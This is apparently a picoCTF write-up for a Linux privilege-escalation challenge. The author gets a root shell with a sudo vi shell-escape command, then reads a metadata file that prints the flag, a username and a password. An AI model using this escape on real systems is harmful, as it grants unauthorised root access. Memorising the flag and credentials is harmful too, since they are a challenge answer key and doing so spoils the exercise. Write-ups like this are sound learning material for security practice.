## **Description**

Getting root access can allow you to read the flag. Luckily there is a python file that you might like to play with.
Additional details will be available after launching your challenge instance.

## **Hints**
None.

## **Approach**
So, google searching using python for privilege escalation in linux and i found an interesting web to solve this. I used 'vi'. It can be used to break out from restricted environments by spawning an interactive system shell.

> Use this command: sudo vi -c ':!/bin/sh' /dev/null 

Then enter the password and it got me a root shell! 

```
cd /
cd challenge
cat metadata.json
{"flag": "picoCTF{pYth0nn_libraryH!j@CK!n9_566dbbb7}", "username": "picoctf", "password": "HYGhWsmPyf"}#
```
